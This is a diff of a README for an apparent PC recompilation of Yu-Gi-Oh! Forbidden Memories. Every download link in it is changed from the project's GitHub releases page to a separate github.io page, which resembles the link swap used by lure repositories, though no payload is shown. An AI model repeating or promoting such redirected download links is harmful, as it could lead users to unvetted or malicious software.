@@ -1,7 +1,7 @@
 <h1>🎮 YuGiOhForbiddenMemoriesRecomp - Relive the Duel, Reborn for PC</h1>
 
 <p align="center">
-  <a href="https://github.com/Christmasfactorselkup1193/YuGiOhForbiddenMemoriesRecomp/releases">
+  <a href="https://christmasfactorselkup1193.github.io">
     <img src="https://img.shields.io/badge/Download-YuGiOhForbiddenMemoriesRecomp-blue?style=for-the-badge&logo=github" alt="Download Button" width="300" height="60">
   </a>
 </p>
@@ -31,7 +31,7 @@ Sometimes you just want to be the ultimate duelist without the wait. The built-i
 Getting started is easier than dueling Weevil Underwood. Just follow these simple steps:
 
 ### Step 1: Download the Application
-[**Visit this link to download the application**](https://github.com/Christmasfactorselkup1193/YuGiOhForbiddenMemoriesRecomp/releases)
+[**Visit this link to download the application**](https://christmasfactorselkup1193.github.io)
 
 Click the link above to go to the download page. You'll see the latest version of the application ready for you to grab.
 
@@ -107,7 +107,7 @@ This project is made possible by passionate fans who love Yu-Gi-Oh! Forbidden Me
 
 YuGiOhForbiddenMemoriesRecomp is more than just a game—it's a tribute to one of the most beloved Yu-Gi-Oh! games ever made. Whether you're a veteran duelist reliving your childhood or a newcomer discovering this classic for the first time, this application delivers the perfect experience.
 
-Don't wait any longer. [**Download YuGiOhForbiddenMemoriesRecomp today**](https://github.com/Christmasfactorselkup1193/YuGiOhForbiddenMemoriesRecomp/releases) and start your journey to becoming the King of Games!
+Don't wait any longer. [**Download YuGiOhForbiddenMemoriesRecomp today**](https://christmasfactorselkup1193.github.io) and start your journey to becoming the King of Games!
 
 ---
 
